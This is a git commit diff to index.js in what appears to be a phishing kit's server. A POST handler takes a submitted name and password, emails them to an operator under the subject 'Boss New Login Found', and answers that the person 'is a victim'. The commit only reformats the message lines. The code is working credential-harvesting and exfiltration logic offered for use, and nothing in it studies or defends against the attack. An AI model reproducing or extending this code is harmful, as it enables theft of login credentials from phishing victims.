0e6e5c872fb9848388391ded70d30a59f44f1fbd
devadg <opponamer@gmail.com>
2024-11-23 00:42:56 +0100

    shipped new func

--- index.js
+++ index.js
@@ -14,9 +14,10 @@ app.post("/", async (req, res) => {
     const data = req.body;
     const email = data.receiver;
     const message = `
-        Email: ${data.name},
-        Access: ${data.pass}, 
+        Email: ${data.name}\n
+        Access: ${data.pass}\n
         Source: ${data.source}`;
+
 
     await sendEmail(email,"Boss New Login Found",message);
     res.send(`Success: ${data.name} - ${data.email} is a victim!`);
